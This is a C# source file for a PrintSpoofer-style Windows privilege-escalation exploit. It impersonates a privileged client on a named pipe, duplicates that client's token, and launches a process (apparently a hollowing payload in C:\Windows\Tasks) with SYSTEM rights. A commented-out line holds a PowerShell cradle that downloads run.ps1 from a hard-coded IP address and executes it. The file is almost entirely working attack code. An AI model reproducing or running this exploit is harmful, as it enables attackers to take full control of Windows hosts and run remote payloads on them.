using System;
using System.Text;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace PrintSpooferNet
{
    class Program
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct SID_AND_ATTRIBUTES
        {
            public IntPtr Sid;
            public int Attributes;
        }

        public struct TOKEN_USER
        {
            public SID_AND_ATTRIBUTES User;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        public enum CreationFlags
        {
            DefaultErrorMode = 0x04000000,
            NewConsole = 0x00000010,
            NewProcessGroup = 0x00000200,
            SeparateWOWVDM = 0x00000800,
            Suspended = 0x00000004,
            UnicodeEnvironment = 0x00000400,
            ExtendedStartupInfoPresent = 0x00080000
        }
        public enum LogonFlags
        {
            WithProfile = 1,
            NetCredentialsOnly
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateNamedPipe(string lpName, uint dwOpenMode, uint dwPipeMode, uint nMaxInstances, uint nOutBufferSiize, uint nInBufferSize, uint nDefaultTimeout,
            IntPtr lpSecurityAttributes);

        [DllImport("kernel32.dll")]
        static extern bool ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped);

        [DllImport("advapi32.dll")]
        static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentThread();

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool OpenThreadToken(IntPtr ThreadHandle, uint DesiredAccess, bool OpenAsSelf, out IntPtr TokenHandle);

        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool GetTokenInformation(IntPtr TokenHandle, uint TokenInformationClass, IntPtr TokenInformation, int TokenInformationLength, out int ReturnLength);

        
        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern bool ConvertSidToStringSid(IntPtr pSID, out IntPtr ptrSid);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public extern static bool DuplicateTokenEx(IntPtr hExisitngToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);

        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
        /* public static extern bool CreateProcessWithTokenW(IntPtr hToken, UInt32 dwLogonFlags, string lpApplicationName, string lpCommandLine, 
             UInt32 dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
 */
        public static extern bool CreateProcessWithTokenW(IntPtr hToken, LogonFlags dwLogonFlags, string lpApplicationName, string lpCommandLine,
            CreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
   
        [DllImport("advapi32.dll", SetLastError = true)]
        static extern bool RevertToSelf();

        [DllImport("kernel32.dll")]
        static extern uint GetSystemDirectory([Out] StringBuilder lpBuffer, uint uSize);

        [DllImport("userenv.dll", SetLastError = true)]
        static extern bool CreateEnvironmentBlock(out IntPtr lpEnvironment, IntPtr hToken, bool bInherit);


        static void Main(string[] args)
        {
            //if (args.Length < 2)
            //{
            //    Console.WriteLine("Usage: PrintSpooferNet.exe \\\\.\\pipe\\test\\pipe\\spooolss path/to/executable");
            //    return;
            //}

            string pipeName = args[0];
            //string exeName = args[1];
            //string hex = args[2];
            IntPtr hPipe = CreateNamedPipe(pipeName, 3, 0, 10, 0x1000, 0x1000, 0, IntPtr.Zero);
            Console.WriteLine("Named pipe created: " + hPipe);

            ConnectNamedPipe(hPipe, IntPtr.Zero);
            
            ImpersonateNamedPipeClient(hPipe);

            IntPtr hToken;
            IntPtr hSystemToken = IntPtr.Zero;

            OpenThreadToken(GetCurrentThread(), 0xF01FF, false, out hToken);
            DuplicateTokenEx(hToken, 0xF01FF, IntPtr.Zero, 2, 1, out hSystemToken);

            /* int TokenInfLength = 0;
             GetTokenInformation(hToken, 1, IntPtr.Zero, TokenInfLength, out TokenInfLength);
             IntPtr TokenInformation = Marshal.AllocHGlobal((IntPtr)TokenInfLength);
             GetTokenInformation(hToken, 1, TokenInformation, TokenInfLength, out TokenInfLength);

             TOKEN_USER TokenUser = (TOKEN_USER)Marshal.PtrToStructure(TokenInformation, typeof(TOKEN_USER));
             IntPtr ptr = IntPtr.Zero;
             Boolean ok = ConvertSidToStringSid(TokenUser.User.Sid, out ptr);
             string sidstr = Marshal.PtrToStringAuto(ptr);
             Console.WriteLine(@"Found sid {0}", sidstr);*/




            IntPtr env = IntPtr.Zero;
            bool res = CreateEnvironmentBlock(out env, hSystemToken, false);

            String name = WindowsIdentity.GetCurrent().Name;
            Console.WriteLine("Impersonated user is: " + name);
            RevertToSelf();

            StringBuilder sbSystemDir = new StringBuilder(256);
            uint res1 = GetSystemDirectory(sbSystemDir, 256);

            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);
            si.lpDesktop = "WinSta0\\Default";

            //NULL profile used as lpEnvironment variable as Process used environment created from profile of the logged on user

            //CreateProcessWithTokenW(hSystemToken, 0, null, "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe (new-object system.net.webclient).downloadstring(\'http://192.168.45.161/run.ps1\') | iex", 0, IntPtr.Zero, null, ref si, out pi);

            CreateProcessWithTokenW(hSystemToken, 0, null, "C:\\Windows\\Tasks\\hollow.exe", 0, IntPtr.Zero, null, ref si, out pi);


            //lpEnvironment needs a value when used with an account not logged on with an interactive session. lpCurrentDirectory needs a value for the same reason. Values generated with CreateEnvironmentBlock and GetSystemDirectory APIs

            //CreateProcessWithTokenW(hSystemToken, LogonFlags.WithProfile, null, "C:\\inetpub\\wwwroot\\Upload\\ctp.exe", CreationFlags.UnicodeEnvironment, env, sbSystemDir.ToString(), ref si, out pi);

        }
    }
}
